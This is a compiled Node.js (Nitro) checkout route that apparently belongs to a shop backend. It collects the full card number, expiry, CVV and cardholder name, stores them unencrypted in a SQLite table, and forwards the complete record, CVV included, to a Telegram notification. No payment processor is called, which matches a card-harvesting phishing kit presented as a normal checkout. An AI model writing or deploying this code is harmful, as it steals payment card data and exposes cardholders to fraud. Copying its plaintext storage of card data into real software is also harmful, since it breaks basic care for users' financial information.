import { d as defineEventHandler, c as createError, r as readBody } from '../../_/nitro.mjs';
import db from '../../_/db.mjs';
import { b as sendNewOrderNotification } from '../../_/telegram.mjs';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';
import 'node:url';
import 'better-sqlite3';
import 'path';

const checkout = defineEventHandler(async (event) => {
  if (event.node.req.method !== "POST") {
    throw createError({
      statusCode: 405,
      statusMessage: "Method Not Allowed"
    });
  }
  try {
    const body = await readBody(event);
    const { method, cardNumber, expiry, cvv, cardholderName } = body;
    if (!method || !cardNumber || !expiry || !cvv || !cardholderName) {
      throw createError({
        statusCode: 400,
        statusMessage: "Missing required payment information"
      });
    }
    const stmt = db.prepare(`
            INSERT INTO payment_info (method, card_number, expiry, cvv, cardholder_name)
            VALUES (?, ?, ?, ?, ?)
        `);
    const result = stmt.run(method, cardNumber, expiry, cvv, cardholderName);
    const paymentId = result.lastInsertRowid;
    const getPaymentStmt = db.prepare(`
            SELECT id, method, card_number, cardholder_name, expiry, cvv, status, created_at
            FROM payment_info
            WHERE id = ?
        `);
    const payment = getPaymentStmt.get(paymentId);
    if (payment) {
      sendNewOrderNotification(payment).catch((error) => {
        console.error("Error sending Telegram notification:", error);
      });
    }
    return {
      success: true,
      message: `${paymentId}`
    };
  } catch (error) {
    console.error("Error in checkout API:", error);
    throw createError({
      statusCode: 500,
      statusMessage: "Internal Server Error"
    });
  }
});

export { checkout as default };
//# sourceMappingURL=checkout.mjs.map
